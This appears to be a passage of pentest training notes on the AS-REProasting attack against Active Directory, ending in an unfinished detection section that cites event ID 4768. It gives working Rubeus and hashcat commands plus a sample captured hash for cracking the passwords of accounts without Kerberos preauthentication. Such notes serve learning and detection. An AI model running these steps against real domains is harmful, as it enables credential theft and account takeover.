- <span style="color:rgb(240, 121, 10)">AS-REProasting:</span> similar to the `Kerberoasting` attack; we can obtain crackable hashes for user accounts that have the property `Do not require Kerberos preauthentication` enabled.
---------------

1) Use Rubeus with 'asreproast' action, it will extract hashes for each user that has `Kerberos preauthentication` not required
```
.\Rubeus.exe asreproast /outfile:asrep.txt
```

2) Add `23$` after `$krb5asrep$` so hashcat can recognize it, example:
```
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460a
```

3) Use hashcat with option -m 18200 for AS-REPRoastable hashes
```
sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
```
 -----------------------------------
 
## Detection:

- Event with ID <span style="color:rgb(240, 121, 10)">4768</span> was generated, signaling that a `Kerberos Authentication ticket` was generated:
